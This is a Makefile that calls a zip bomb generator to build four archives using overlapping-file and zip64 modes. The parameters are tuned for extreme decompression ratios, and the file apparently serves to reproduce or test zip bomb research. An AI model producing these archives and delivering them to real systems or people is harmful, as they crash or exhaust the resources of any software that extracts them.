ZIPBOMB = python3 zipbomb

.PHONY: all
all: overlap.zip zbsm.zip zblg.zip zbxl.zip

overlap.zip:
	$(ZIPBOMB) --mode=full_overlap --numfiles=442 --compressed-size=21141 > "$@"

zbsm.zip:
	$(ZIPBOMB) --mode=quoted_overlap --numfiles=251 --compressed-size=21094 > "$@"

zblg.zip:
	$(ZIPBOMB) --mode=quoted_overlap --numfiles=65535 --max-uncompressed-size=4292788491 > "$@"

zbxl.zip:
	$(ZIPBOMB) --mode=quoted_overlap --numfiles=190024 --compressed-size=22982667 --zip64 > "$@"

.DELETE_ON_ERROR:
